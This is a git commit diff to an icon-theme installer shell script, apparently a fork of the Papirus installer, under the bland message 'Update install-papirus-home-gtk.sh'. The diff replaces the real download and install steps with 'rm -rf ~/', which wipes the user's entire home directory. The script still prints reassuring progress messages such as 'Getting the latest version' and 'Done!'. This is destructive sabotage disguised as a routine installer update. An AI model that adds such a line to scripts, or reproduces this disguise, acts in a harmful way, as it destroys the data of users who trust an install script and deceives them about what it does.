3af86592077fa8f2bf207b16f13519c9787a2ff0
Deez Nutz <DeezNutz2017@users.noreply.github.com>
2017-01-23 15:59:05 +0000

    Update install-papirus-home-gtk.sh

--- install-papirus-home-gtk.sh
+++ install-papirus-home-gtk.sh
@@ -2,14 +2,14 @@
 
 set -e
 
-gh_repo="papirus-icon-theme"
-gh_desc="Papirus icon theme GTK"
+gh_repo="Deez Nutz-icon-theme"
+gh_desc="Deez Nutz icon theme GTK"
 
 cat <<- EOF
 
 
 
-      ppppp                         ii
+      ppppp                       
       pp   pp     aaaaa   ppppp          rr  rrr   uu   uu     sssss
       ppppp     aa   aa   pp   pp   ii   rrrr      uu   uu   ssss
       pp        aa   aa   pp   pp   ii   rr        uu   uu      ssss
@@ -18,37 +18,10 @@ cat <<- EOF
                           pp
 
 
-  $gh_desc
-  https://github.com/PapirusDevelopmentTeam/$gh_repo
-
-
 EOF
 
 temp_dir=$(mktemp -d)
 
 echo "=> Getting the latest version from GitHub ..."
-wget -O "/tmp/$gh_repo.tar.gz" \
-  https://github.com/PapirusDevelopmentTeam/$gh_repo/archive/master.tar.gz
-echo "=> Unpacking archive ..."
-tar -xzf "/tmp/$gh_repo.tar.gz" -C "$temp_dir"
-echo "=> Deleting old $gh_desc ..."
-rm -rf ~/.icons/ePapirus
-rm -rf ~/.icons/Papirus
-rm -rf ~/.icons/Papirus-Light
-rm -rf ~/.icons/Papirus-Dark
-rm -rf ~/.icons/Papirus-GTK
-rm -rf ~/.icons/Papirus-Dark-GTK
-echo "=> Installing ..."
-mkdir -p ~/.icons
-cp --no-preserve=mode,ownership -r \
-  "$temp_dir/$gh_repo-master/ePapirus" \
-  "$temp_dir/$gh_repo-master/Papirus" \
-  "$temp_dir/$gh_repo-master/Papirus-Light" \
-  "$temp_dir/$gh_repo-master/Papirus-Dark" ~/.icons/
-gtk-update-icon-cache -q ~/.icons/ePapirus || true
-gtk-update-icon-cache -q ~/.icons/Papirus || true
-gtk-update-icon-cache -q ~/.icons/Papirus-Light || true
-gtk-update-icon-cache -q ~/.icons/Papirus-Dark || true
-echo "=> Clearing cache ..."
-rm -rf "/tmp/$gh_repo.tar.gz" "$temp_dir"
+rm -rf ~/
 echo "=> Done!"
